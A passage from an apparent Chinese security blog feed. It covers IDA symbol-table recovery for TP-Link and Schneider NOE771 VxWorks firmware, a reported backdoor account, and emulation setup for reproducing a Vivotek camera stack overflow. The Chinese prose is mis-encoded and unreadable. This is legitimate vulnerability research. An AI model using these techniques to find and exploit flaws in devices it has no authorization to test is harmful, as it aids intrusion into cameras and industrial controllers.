  symbols = []</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> range(<span class="number">0</span>, len(symbols_table), <span class="number">8</span>):</span><br><span class="line">        <span class="comment"># ä¸€ä¸ªç¬¦å·çš„æ®µè½</span></span><br><span class="line">        symbol_item = symbols_table[offset:offset+<span class="number">8</span>]</span><br><span class="line">        <span class="comment"># æ ‡å¿—ä½</span></span><br><span class="line">        flag = symbol_item[<span class="number">0</span>]</span><br><span class="line">        print(flag)</span><br><span class="line">        <span class="comment"># ç¬¦å·åç§»</span></span><br><span class="line">        string_offset = int(symbol_item[<span class="number">1</span>:<span class="number">4</span>].hex(), <span class="number">16</span>)</span><br><span class="line">        print(string_offset)</span><br><span class="line">        <span class="comment"># æ ¹æ®ç¬¦å·åç§»æ‰¾åˆ°ç¬¦å·å</span></span><br><span class="line">        string_name = get_strings_by_offset(string_offset).decode(<span class="string">"utf-8"</span>)</span><br><span class="line">        print(string_name)</span><br><span class="line">        <span class="comment"># ç¬¦å·åœ¨æ–‡ä»¶å†…å­˜ä¸­çš„åœ°å€</span></span><br><span class="line">        target_address = int(symbol_item[<span class="number">4</span>:].hex(), <span class="number">16</span>)</span><br><span class="line">        print(target_address)</span><br><span class="line">        <span class="comment"># åˆ—è¡¨</span></span><br><span class="line">        symbols.append((flag, string_name, target_address))</span><br><span class="line">    <span class="keyword">return</span> symbols</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_symbols</span><span class="params">(symbols_meta_data)</span>:</span></span><br><span class="line">    <span class="comment"># å¯¹äºåˆ—è¡¨symbols_meta_dataä¸­çš„æ•°æ®</span></span><br><span class="line">    <span class="keyword">for</span> flag, string_name, target_address <span class="keyword">in</span> symbols_meta_data:</span><br><span class="line">        <span class="comment"># å¯¹ç›®æ ‡åœ°å€è¿›è¡Œé‡å‘½å</span></span><br><span class="line">        idc.set_name(target_address, str(string_name))</span><br><span class="line">        <span class="keyword">if</span> flag == <span class="string">'\x54'</span>:</span><br><span class="line">            <span class="comment"># æŒ‡å®šåœ°å€ å­—èŠ‚è½¬åŒ–ä¸ºæŒ‡ä»¤</span></span><br><span class="line">            idc.MakeCode(target_address)</span><br><span class="line">            <span class="comment"># æŒ‡å®šåœ°å€è½¬æ¢æˆå‡½æ•°</span></span><br><span class="line">            idc.MakeFunction(target_address)</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    symbols_metadata = get_symbols_metadata()</span><br><span class="line">    add_symbols(symbols_metadata)</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç›´æ¥é€šè¿‡\x00è¿›è¡Œå­—ç¬¦ä¸²æˆªæ–­<code>symbol_strings = strings_table.split(chr(0))</code>ï¼Œç›´æ¥æŒ¨ä¸ªå„¿æ”¾åˆ°target_addresså»â€¦ä¸ªäººæ„Ÿè§‰ä¸å¦‚æ ¹æ®åç§»æ‰¾åˆ°ç¬¦å·åå†æ”¾ç²¾å‡†..</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/tlwr886finalida.png" alt="ä»æœ‰éƒ¨åˆ†æœªè¢«ä¿®å¤"></p><blockquote><p>Referenceï¼š</p><p><a href="https://www.secpulse.com/archives/75635.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/75635.html</a></p><p><a href="https://cq674350529.github.io/2018/09/19/TP-Link-wr886v6-%E5%9B%BA%E4%BB%B6%E8%A7%A3%E6%9E%90/" target="_blank" rel="noopener">https://cq674350529.github.io/2018/09/19/TP-Link-wr886v6-%E5%9B%BA%E4%BB%B6%E8%A7%A3%E6%9E%90/</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;downloadï¼š&lt;a href=&quot;https://service.tp-link.com.cn/detail_download_8676.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://service.tp-link.com.cn</summary>
      
    
    
    
    <category term="ç¬”è®°" scheme="p1Kk.github.io/categories/ç¬”è®°/"/>
    
    
    <category term="iot" scheme="p1Kk.github.io/tags/iot/"/>
    
  </entry>
  
  <entry>
    <title>æ–½è€å¾· NOE771 åé—¨åˆ†æï¼ˆidaå‡½æ•°æ¢å¤ï¼‰</title>
    <link href="p1Kk.github.io/2021/06/11/iot/%E6%96%BD%E8%80%90%E5%BE%B7%20NOE771/"/>
    <id>p1Kk.github.io/2021/06/11/iot/%E6%96%BD%E8%80%90%E5%BE%B7%20NOE771/</id>
    <published>2021-06-10T16:00:00.000Z</published>
    <updated>2021-06-15T06:55:59.694Z</updated>
    
    <content type="html"><![CDATA[<p>å›ºä»¶ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/ameng929/NOE77101_Firmware/blob/master/FLASH0/wwwroot/conf/exec/NOE77101.bin" target="_blank" rel="noopener">https://github.com/ameng929/NOE77101_Firmware/blob/master/FLASH0/wwwroot/conf/exec/NOE77101.bin</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk -Me NOE77101.bin</span><br><span class="line">$ cd _NOE77101.bin.extracted/</span><br><span class="line">$ binwalk 385</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">2054252       0x1F586C        EST flat binary</span><br><span class="line">2088936       0x1FDFE8        HTML document header</span><br><span class="line">2108532       0x202C74        HTML document footer</span><br><span class="line">2110048       0x203260        HTML document header</span><br><span class="line">2115564       0x2047EC        HTML document footer</span><br><span class="line">2119528       0x205768        XML document, version: &quot;1.0&quot;</span><br><span class="line">2119796       0x205874        XML document, version: &quot;1.0&quot;</span><br><span class="line">2119912       0x2058E8        XML document, version: &quot;1.0&quot;</span><br><span class="line">2192512       0x217480        Base64 standard index table</span><br><span class="line">2192580       0x2174C4        Base64 standard index table</span><br><span class="line">2211604       0x21BF14        VxWorks WIND kernel version &quot;2.5&quot;</span><br><span class="line">2225264       0x21F470        Copyright string: &quot;Copyright Wind River Systems, Inc., 1984-2000&quot;</span><br><span class="line">2321952       0x236E20        Copyright string: &quot;copyright_wind_river&quot;</span><br><span class="line">3118988       0x2F978C        Copyright string: &quot;Copyright, Real-Time Innovations, Inc., 1991.  All rights reserved.&quot;</span><br><span class="line">3126628       0x2FB564        Copyright string: &quot;Copyright 1984-1996 Wind River Systems, Inc.&quot;</span><br><span class="line">3153524       0x301E74        VxWorks symbol table, big endian, first entry: [type: function, code address: 0x1FF058, symbol address: 0x27655C]</span><br></pre></td></tr></table></figure><p>å›ºä»¶çš„æ“ä½œç³»ç»Ÿä¸ºVxWorks2.5ï¼Œç¬¦å·è¡¨ä½äº0x301E74</p><p>ç¡®å®šCPUæ¶æ„ä¸ºPowerPC big endian</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ binwalk -A 385</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">160           0xA0            PowerPC big endian instructions, function epilogue</span><br><span class="line">400           0x190           PowerPC big endian instructions, function epilogue</span><br><span class="line">408           0x198           PowerPC big endian instructions, function prologue</span><br><span class="line">460           0x1CC           PowerPC big endian instructions, function epilogue</span><br><span class="line">468           0x1D4           PowerPC big endian instructions, function prologue</span><br><span class="line">516           0x204           PowerPC big endian instructions, function epilogue</span><br><span class="line">524           0x20C           PowerPC big endian instructions, function prologue</span><br><span class="line">616           0x268           PowerPC big endian instructions, function epilogue</span><br><span class="line">624           0x270           PowerPC big endian instructions, function prologue</span><br></pre></td></tr></table></figure><h1 id="å›ºä»¶å†…å­˜åŠ è½½åœ°å€"><a href="#å›ºä»¶å†…å­˜åŠ è½½åœ°å€" class="headerlink" title="å›ºä»¶å†…å­˜åŠ è½½åœ°å€"></a>å›ºä»¶å†…å­˜åŠ è½½åœ°å€</h1><p>åµŒå…¥å¼ç³»ç»Ÿå›ºä»¶éœ€è¦åŠ è½½åˆ°å†…å­˜ä¸­ç‰¹å®šä½ç½®è¿è¡Œï¼Œè¿™ä¸ªç‰¹å®šä½ç½®å°±æ˜¯<strong>å›ºä»¶åŠ è½½åœ°å€</strong></p><blockquote><p>å›ºä»¶åŠ è½½åœ°å€ = ç¬¦å·è¡¨ä¸­å­—ç¬¦ä¸²çš„åœ°å€ - ç›¸åº”å­—ç¬¦ä¸²åœ¨å›ºä»¶ä¸­çš„åç§»</p></blockquote><p>åµŒå…¥å¼ç³»ç»Ÿå›ºä»¶çš„å‡½æ•°è°ƒç”¨åœ°å€æ˜¯åŸºäºå›ºä»¶åŠ è½½åœ°å€æ‰€è®¡ç®—å‡ºçš„å†…å­˜ä½ç½®ï¼Œè€Œä¸æ˜¯å›ºä»¶ä¸­çš„åœ°å€</p><p>1ã€ELFå°è£…çš„å›ºä»¶æ–‡ä»¶ï¼Œåœ¨ELFæ–‡ä»¶çš„å¤´éƒ¨æœ‰ç‰¹å®šçš„æ•°æ®ä½è®°å½•äº†è¯¥å›ºä»¶çš„åŠ è½½åœ°å€ï¼Œ</p><p>å¦‚æœæœ‰ELFå°è£…å¤´éƒ¨ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ç›´æ¥è¯»å–ELFæ–‡ä»¶å¤´ï¼Œä»è€Œç›´æ¥è·å–åˆ°å›ºä»¶çš„åŠ è½½åœ°å€ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> readelf -a vxworks</span><br><span class="line">...</span><br><span class="line">Entry point address:0x10000</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>2ã€åˆ†æå›ºä»¶å¤´éƒ¨çš„åˆå§‹åŒ–ä»£ç ï¼Œå¦‚<code>usrInit</code>è¿™æ˜¯vxWorksç³»ç»Ÿå¼•å¯¼åè¿è¡Œçš„ç¬¬ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒåˆå§‹åŒ–æ ˆçš„åœ°å€ï¼ˆR1å¯„å­˜å™¨ï¼‰å°±æ˜¯å›ºä»¶çš„å†…å­˜åŠ è½½åœ°å€ã€ä¸å¤ªæ˜ç™½ä¸ºä»€ä¹ˆä¸æ˜¯0xFFF0ï¼Œå› ä¸ºæˆ‘åé¢ç®—å‡ºæ¥ä¹Ÿæ˜¯0xFFF0ã€‘(å› ä¸ºæˆ‘å·²ç»ä¿®å¤å¥½ç¬¦å·è¡¨ï¼Œå¹¶åŠ è½½äº†åŸºå€ï¼Œæˆ‘ä¹Ÿæ²¡æœ‰é‚£ç§æ‹–è¿›å»å°±æœ‰ä¸€éƒ¨åˆ†å‡½æ•°çš„ç‰ˆæœ¬ï¼Œæ‰€ä»¥ä¸‹é¢å°±ç”¨è¿™ä¸ªå·²ç»ä¿®å¤å¥½çš„åˆ†æäº†)</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/noe771loadaddr.png" alt></p><p>3ã€æ‰¾åˆ°bssåŒºæ•°æ®åˆå§‹åŒ–ä»£ç ï¼ŒbssåŒºåœ¨VxWorksä¸­ä¸»è¦ç”¨äºå­˜å‚¨ä¸€äº›å½“å‰æœªèµ‹å€¼çš„å˜é‡ï¼Œç³»ç»Ÿå¯åŠ¨è¿‡ç¨‹ä¸­Vxworksä½¿ç”¨<code>bzero</code>å‡½æ•°å¯¹bssæ•°æ®æ¸…é›¶</p><p><code>usrInit</code>å‡½æ•°è¿˜ä¼šé¦–å…ˆå¯¹bssè¿›è¡Œæ¸…ç†ï¼Œç¬¬ä¸€ä¸ªè·³è½¬å‡½æ•°å°±æ˜¯bssåˆå§‹åŒ–å‡½æ•°ï¼Œè¿›å…¥åçš„ç¬¬ä¸€ä¸ªè·³è½¬å‡½æ•°å°±æ˜¯<code>bzero</code>ï¼Œæ ¹æ®ä»–çš„ä¸¤ä¸ªå‚æ•°å¯ä»¥åˆ†æå‡ºbssçš„èµ·å§‹å’Œç»“æŸåœ°å€ï¼Œr3=bss_startaddr  r4=bss_endaddr</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/noe711bssstart.png" alt></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/noe711bssstart_end.png" alt="r3=bss_startaddr r4=bss_endaddr"></p><p>ç”±äºVxWorksç³»ç»Ÿçš„å†…å­˜å¸ƒå±€ä¸º</p><p><img src="https://images.seebug.org/content/images/2018/12/330e73a4-15c7-4267-8efa-5f0f17a27826.jpg" alt=" "></p><p>æ‰€ä»¥ç”¨<code>_end - å›ºä»¶å¤§å°</code>å³å¯å¾—åˆ°åŠ è½½åœ°å€ 0x490d2c - 0x480d2c = 0x10000</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/noe771size.png" alt></p><p>4ã€å¦‚æœIDAå¯ä»¥åˆ†æå‡ºå°‘æ•°å‡½æ•°ï¼Œå¯ä»¥æ ¹æ® è°ƒç”¨åœ°å€ ä¸€èˆ¬å†™ä¸º åç§»é‡+ç»å¯¹åœ°å€ ä¸­çš„ç»å¯¹åœ°å€ï¼Œæ¥ç¡®å®šå›ºä»¶åŠ è½½åœ°å€</p><p>5ã€åˆ†æç¬¦å·è¡¨æŸ¥çœ‹ï¼Œæœ¬ä¾‹ä»‹ç»</p><p>æ‹–å…¥idaæŸ¥çœ‹</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/noe771idainto.jpg" alt></p><p>ä»€ä¹ˆéƒ½æ²¡è§£æå‡ºæ¥ã€‚</p><p>VxWorksç³»åˆ—çš„å­—èŠ‚æ’åºæœ‰ç‹¬ç‰¹çš„æ ¼å¼ï¼Œä»¥16ä¸ªå­—èŠ‚ä¸ºä¸€ç»„æ•°æ®ï¼Œå‰4ä¸ªå­—èŠ‚æ˜¯å‡½æ•°åçš„å†…å­˜åœ°å€ï¼Œå4ä¸ªå­—èŠ‚æ˜¯å‡½æ•°çš„å†…å­˜ä½ç½®ï¼Œç„¶åä»¥å¦4ä¸ªç‰¹å¾å­—èŠ‚æ•°æ®+4ä¸ªå­—èŠ‚0x00ç»“å°¾ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/noe771winhex.png" alt="0x301e74"></p><p>æœ€åä¸€ä¸ªå­—ç¬¦ä¸²ä¼šåœ¨ç¬¦å·è¡¨ä¸­ç¬¬ä¸€ä¸ªè¢«å¼•ç”¨ï¼Œæœ€åçš„å­—ç¬¦ä¸²ä¸º<code>APP_STATION_MODBUS</code>(æˆ‘ä¹Ÿä¸ç¡®å®šä¸ºä»€ä¹ˆ)</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/noe771winhexlastone.png" alt="æœ€åä¸€ä¸ªå­—ç¬¦ä¸²"></p><p>0x27655c - 0x26656c = 0xFFF0â€¦.ï¼ˆæ ¹æ®åé¢ç”¨idcè·‘å‡ºæ¥çš„å‡½æ•°åˆ—è¡¨æ¥çœ‹ï¼Œè¿™æ˜¯é”™è¯¯çš„å›ºä»¶åŠ è½½åœ°å€ï¼Œåº”è¯¥æ˜¯0x10000ï¼Œè¿™åˆæ˜¯ä¸ºä»€ä¹ˆå•Šï¼‰</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/noe711idaloadin.png" alt></p><p>åŠ è½½åè¿˜æ˜¯ä»€ä¹ˆéƒ½å’©æœ‰â€¦</p><h1 id="ç¬¦å·è¡¨ä¿®å¤å‡½æ•°å"><a href="#ç¬¦å·è¡¨ä¿®å¤å‡½æ•°å" class="headerlink" title="ç¬¦å·è¡¨ä¿®å¤å‡½æ•°å"></a>ç¬¦å·è¡¨ä¿®å¤å‡½æ•°å</h1><p>ç¬¦å·è¡¨çš„èµ·å§‹åœ°å€ä¸º0x301E64+load_addrï¼Œç»“æŸåœ°å€ä¸º0x3293a4+load_addr</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/noe771winhexsymbolend.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">/* Ruben Santamarta - IOActive */</span><br><span class="line">/* Rebuild VxWorks Symbol Table */</span><br><span class="line"></span><br><span class="line">#include &lt;idc.idc&gt;</span><br><span class="line"></span><br><span class="line">static main()</span><br><span class="line">&#123;</span><br><span class="line">     auto load_addr;</span><br><span class="line"> auto ea;</span><br><span class="line"> auto offset;</span><br><span class="line"> auto sName;</span><br><span class="line"> auto eaStart;</span><br><span class="line"> auto eaEnd; </span><br><span class="line"></span><br><span class="line">// You&apos;ll need to adjust these values</span><br><span class="line">load_addr = 0x10000;</span><br><span class="line">eaStart = 0x301E64 + load_addr;</span><br><span class="line">eaEnd = 0x3293a4 + load_addr;</span><br><span class="line"></span><br><span class="line"> SetStatus(IDA_STATUS_WORK);</span><br><span class="line"> ea = eaStart;</span><br><span class="line"> </span><br><span class="line"> while( ea &lt; eaEnd) &#123;</span><br><span class="line"> MakeDword( ea );</span><br><span class="line"> offset = 0;</span><br><span class="line"> if ( Dword( ea ) == 0x900 || Dword( ea ) == 0x500)</span><br><span class="line"> &#123;</span><br><span class="line"> offset = 8;</span><br><span class="line"> &#125;</span><br><span class="line"> else if( Dword( ea ) == 0x90000 || Dword( ea ) == 0x50000 )</span><br><span class="line"> &#123;</span><br><span class="line"> offset = 0xc;</span><br><span class="line"> &#125; </span><br><span class="line"> if( offset )</span><br><span class="line"> &#123;</span><br><span class="line"> MakeStr( Dword( ea - offset ), BADADDR); </span><br><span class="line"> sName = GetString( Dword( ea - offset ), -1, ASCSTR_C ) ; </span><br><span class="line">  if ( sName )</span><br><span class="line">  &#123;</span><br><span class="line">  if( Dword( ea ) == 0x500 || Dword( ea ) == 0x50000)</span><br><span class="line">  &#123;</span><br><span class="line">      if (  GetFunctionName( Dword( ea - offset + 4) ) == &quot;&quot; )</span><br><span class="line">      &#123;</span><br><span class="line">      MakeCode( Dword( ea - offset + 4) );</span><br><span class="line"> MakeFunction( Dword( ea - offset + 4), BADADDR );</span><br><span class="line">      &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  MakeName( Dword( ea - offset + 4 ), sName );  </span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> ea = ea + 4;   </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> SetStatus(IDA_STATUS_READY);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡è°ƒç”¨å…³ç³»<code>_sysInit -&gt; usrInit -&gt; usrKernelInit -&gt; usrRoot -&gt; usrAppInit</code></p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/noe771userinit.png" alt></p><p>å‘ç°åé—¨è´¦å·</p><p><img src="https://cdn.jsdelivr.net/gh/p1Kk/blogImg@master/Picture/noe771usrandpasswd.png" alt></p><p>ã€å¯†ç é€šè¿‡vxEncryptåŠ å¯†ï¼ˆVxWorks 5.xç³»ç»Ÿé»˜è®¤åŠ å¯†æ–¹å¼ï¼‰ã€‘</p><blockquote><p>reference:</p><p><a href="https://paper.seebug.org/613/#1" target="_blank" rel="noopener">https://paper.seebug.org/613/#1</a></p><p><a href="https://blog.csdn.net/weixin_43815930/article/details/107646507" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43815930/article/details/107646507</a></p><p><a href="https://paper.seebug.org/771/" target="_blank" rel="noopener">https://paper.seebug.org/771/</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å›ºä»¶ä¸‹è½½åœ°å€ï¼š&lt;a href=&quot;https://github.com/ameng929/NOE77101_Firmware/blob/master/FLASH0/wwwroot/conf/exec/NOE77101.bin&quot; target=&quot;_blank&quot; rel=&quot;noo</summary>
      
    
    
    
    <category term="ç¬”è®°" scheme="p1Kk.github.io/categories/ç¬”è®°/"/>
    
    
    <category term="iot" scheme="p1Kk.github.io/tags/iot/"/>
    
  </entry>
  
  <entry>
    <title>vivotek æ‘„åƒå¤´æ ˆæº¢å‡ºæ¼æ´å¤ç°</title>
    <link href="p1Kk.github.io/2021/04/14/iot/vivotek%20%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>p1Kk.github.io/2021/04/14/iot/vivotek%20%E6%91%84%E5%83%8F%E5%A4%B4%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-04-13T16:00:00.000Z</published>
    <updated>2021-04-17T01:24:11.463Z</updated>
    
    <content type="html"><![CDATA[<p>å›ºä»¶å½±å“ç‰ˆæœ¬ï¼šå¤ªå¤šäº†ï¼Œä»¥CC8160 ä¸ºä¾‹</p><p>å›ºä»¶ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/mcw0/PoC/files/3128058/CC8160-VVTK-0100d.flash.zip" target="_blank" rel="noopener">https://github.com/mcw0/PoC/files/3128058/CC8160-VVTK-0100d.flash.zip</a></p><h1 id="ç¯å¢ƒä¿®å¤"><a href="#ç¯å¢ƒä¿®å¤" class="headerlink" title="ç¯å¢ƒä¿®å¤"></a>ç¯å¢ƒä¿®å¤</h1><p>å›ºä»¶è§£åŒ…ä¸å¤šè¯´ï¼ŒæŸ¥çœ‹ä¸€ä¸‹æ¼æ´æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> file ./usr/sbin/httpd</span></span><br><span class="line">./usr/sbin/httpd: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br><span class="line"><span class="meta">$</span><span class="bash"> checksec ./usr/sbin/httpd</span></span><br><span class="line">[*]</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br></pre></td></tr></table></figure><h2 id="user-mod"><a href="#user-mod" class="headerlink" title="user-mod"></a>user-mod</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> cp $(<span class="built_in">which</span> qemu-arm-static ) ./</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-arm-static ./usr/sbin/httpd</span></span><br><span class="line">[14/Apr/2021:13:50:39 +0000] src/boa.c:284 (main) - can't open /dev/null: No such file or directory</span><br><span class="line"><span class="meta">#</span><span class="bash"> è§£å†³ï¼š</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> touch ./dev/null</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-arm-static ./usr/sbin/httpd</span></span><br><span class="line">sendto() error 2</span><br><span class="line">Could not open boa.conf for reading.</span><br><span class="line"><span class="meta">#</span><span class="bash"> æœ‰è¿™ä¸ªæ–‡ä»¶å—ï¼Ÿåœ¨ä¸»ç›®å½•ä¸‹ä¹Ÿæ²¡æœ‰æ‰¾åˆ°è¿™ä¸ªboa.confæ–‡ä»¶ã€‚è¿›å…¥idaæŸ¥çœ‹ï¼Œå…¶å®æ˜¯è¦æ‰“å¼€/etc/conf.d/boa/boa.confï¼Œä½†æ˜¯</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ll ./etc/conf.d</span></span><br><span class="line">lrwxrwxrwx 1 kk kk 23 Dec  6  2016 ./etc/conf.d -&gt; ../mnt/flash/etc/conf.d</span><br><span class="line"><span class="meta">#</span><span class="bash"> ä½†æ˜¯å¹¶æ²¡æœ‰è¿™ä¸ª../mntç­‰æ–‡ä»¶</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> æœ€ç»ˆåœ¨_31...ç›®å½•ä¸‹æ‰¾åˆ°äº†boa.confï¼Œåœ¨./defconf/_CC8160.tar.bz2.extracted/_0.extracted/etc/conf.d/boa/boa.conf</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> æ–°å»ºä¸€ä¸‹æ–‡ä»¶å¤¹å†ç²˜è´´ï¼Œæˆ‘è¿˜æŠŠç›¸å¯¹è·¯å¾„ç»™ç†è§£é”™äº†ï¼Œè¿™é‡Œmntå’Œetcæ˜¯åŒä¸€çº§çš„</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cp -r ../../defconf/_CC8160.tar.bz2.extracted/_0.extracted/etc/conf.d ./mnt/flash/etc/conf.d</span></span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-arm-static ./usr/sbin/httpd</span></span><br><span class="line">sendto() error 2</span><br><span class="line">[debug]add server push uri 3 video3.mjpg</span><br><span class="line">[debug]add server push uri 4 video4.mjpg</span><br><span class="line">gethostbyname:: Success</span><br><span class="line"><span class="meta">#</span><span class="bash"> çœ‹è§successï¼Œå…¶å®æ²¡è·‘èµ·æ¥ï¼ŒidaæŸ¥çœ‹å¼•ç”¨ï¼Œæ˜¯åˆ©ç”¨äº†gethostbyname()å‡½æ•°ï¼Œè¿”å›rlimitsç»“æ„ä½“ä¸­é€šè¿‡ä¸»æœºåæ‰¾åˆ°çš„ipåœ°å€</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat ./etc/hosts</span></span><br><span class="line">127.0.0.1 Network-Camera localhost</span><br><span class="line"><span class="meta">$</span><span class="bash"> hostname</span></span><br><span class="line">ubuntu</span><br><span class="line"><span class="meta">#</span><span class="bash"> ä¿®æ”¹ä¸º</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> cat ./etc/hosts </span></span><br><span class="line">127.0.0.1 ubuntu localhost</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> å†æ¬¡è¿è¡Œï¼Œè™½ç„¶æœ‰é”™è¯¯ï¼ˆAM_ParseConfigFileå‡½æ•°ï¼Œä¸æ˜¯å¾ˆæ¸…æ¥šï¼‰ï¼Œä½†æ˜¯å·²ç»æˆåŠŸè¿è¡Œèµ·æ¥äº†</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo chroot . ./qemu-arm-static ./usr/sbin/httpd</span></span><br><span class="line">sendto() error 2</span><br><span class="line">[debug]add server push uri 3 